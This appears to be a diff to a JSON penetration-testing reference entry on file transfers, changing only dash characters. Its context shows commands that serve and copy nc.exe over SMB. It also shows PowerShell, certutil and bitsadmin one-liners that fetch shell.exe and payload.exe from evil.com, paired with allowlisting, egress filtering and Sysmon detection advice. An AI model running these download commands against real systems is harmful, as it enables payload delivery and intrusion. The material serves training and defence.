@@ -26,7 +26,7 @@
   "source": "CPTS Module 07: File Transfers",
   "examples": [
     {
-      "label": "CPTS Ch07 — serve /tmp/smbshare unauthenticated, copy nc.exe",
+      "label": "CPTS Ch07 - serve /tmp/smbshare unauthenticated, copy nc.exe",
       "command": "# Attacker:\nsudo impacket-smbserver share -smb2support /tmp/smbshare\n# Target:\ncopy \\\\192.168.220.133\\share\\nc.exe"
     },
     {
@@ -34,7 +34,7 @@
       "command": "# Attacker:\nsudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n# Target:\nnet use n: \\\\192.168.220.133\\share /user:test test\ncopy n:\\nc.exe"
     }
   ],
-  "notes": "`impacket-smbserver share . -smb2support` on the attacker, then `copy \\\\<lhost>\\share\\file .` on Windows. Fast and native. Add `-user/-password` since Win10+ blocks guest SMB. Modern Windows blocks unauthenticated guest SMB access — add -user/-password when that error appears. Use 'net use' to mount share persistently. impacket-smbserver auto-handles SMBv2 with -smb2support. Also covered in: CPTS Ch07 (File Transfers).",
+  "notes": "`impacket-smbserver share . -smb2support` on the attacker, then `copy \\\\<lhost>\\share\\file .` on Windows. Fast and native. Add `-user/-password` since Win10+ blocks guest SMB. Modern Windows blocks unauthenticated guest SMB access - add -user/-password when that error appears. Use 'net use' to mount share persistently. impacket-smbserver auto-handles SMBv2 with -smb2support. Also covered in: CPTS Ch07 (File Transfers).",
   "references": [
     {
       "title": "Impacket smbserver.py",
@@ -98,7 +98,7 @@
     ],
     "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
     "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
   },
   "variations": [
     {
